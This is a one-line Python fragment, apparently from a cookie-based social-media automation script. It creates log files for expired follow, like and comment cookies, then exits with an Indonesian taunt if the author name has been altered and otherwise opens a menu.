    open('Expired/Cookie-Follow.txt','a');open('Expired/Cookie-Like.txt','a');open('Expired/Cookie-Comment.txt','a');clear();Terminal_Size();print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Juan Hulu' else menu())